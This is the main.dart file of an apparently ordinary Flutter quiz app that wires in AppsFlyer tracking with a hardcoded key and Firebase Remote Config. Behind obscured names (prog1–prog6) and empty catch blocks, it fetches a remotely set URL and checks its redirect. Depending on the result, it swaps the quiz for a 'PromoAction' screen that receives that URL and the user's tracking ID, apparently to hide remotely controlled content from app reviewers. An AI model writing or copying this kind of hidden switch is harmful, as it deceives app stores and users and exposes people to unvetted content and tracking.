// ignore_for_file: empty_catches

import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'core/utils.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/home/pages/firebase_options.dart';
import 'features/home/pages/level_page.dart';

late AppsflyerSdk _aps;
String progx = '';
String apx = '';
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await initMer();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  runApp(const MyApp());
}

Future<bool> promoAction() async {
  final prog1 = FirebaseRemoteConfig.instance;
  await prog1.fetchAndActivate();
  String prog2 = prog1.getString('quizPromo');
  String prog3 = prog1.getString('promoAction');
  if (!prog2.contains('quizNone')) {
    final prog4 = HttpClient();
    final prog5 = Uri.parse(prog2);
    final prog6 = await prog4.getUrl(prog5);
    prog6.followRedirects = false;
    final response = await prog6.close();
    if (response.headers.value(HttpHeaders.locationHeader) != prog3) {
      progx = prog2;
      return true;
    } else {
      return false;
    }
  }
  return prog2.contains('quizNone') ? false : true;
}

Future<void> initMer() async {
  try {
    final AppsFlyerOptions options = AppsFlyerOptions(
      showDebug: false,
      afDevKey: 'doJsrj8CyhTUWPZyAYTByE',
      appId: '6736608012',
      timeToWaitForATTUserAuthorization: 15,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false,
    );
    _aps = AppsflyerSdk(options);

    await _aps.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    apx = await _aps.getAppsFlyerUID() ?? '';

    _aps.startSDK(
      onSuccess: () {},
      onError: (int code, String message) {},
    );
  } catch (e) {}
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  @override
  Widget build(BuildContext context) {
    precacheImages(context);
    return FutureBuilder<bool>(
        future: promoAction(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.white,
              width: double.infinity,
              height: double.infinity,
              child: Image.asset(
                'assets/bg.png',
                fit: BoxFit.cover,
              ),
            );
          } else {
            if (snapshot.data == true && progx != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: PromoAction(
                  promoTitle: progx,
                  promoDescription: apx,
                ),
              );
            } else {
              return MultiBlocProvider(
                providers: [
                  BlocProvider(create: (context) => HomeBloc()),
                ],
                child: MaterialApp.router(
                  debugShowCheckedModeBanner: false,
                  theme: theme,
                  routerConfig: routerConfig,
                ),
              );
            }
          }
        });
  }
}
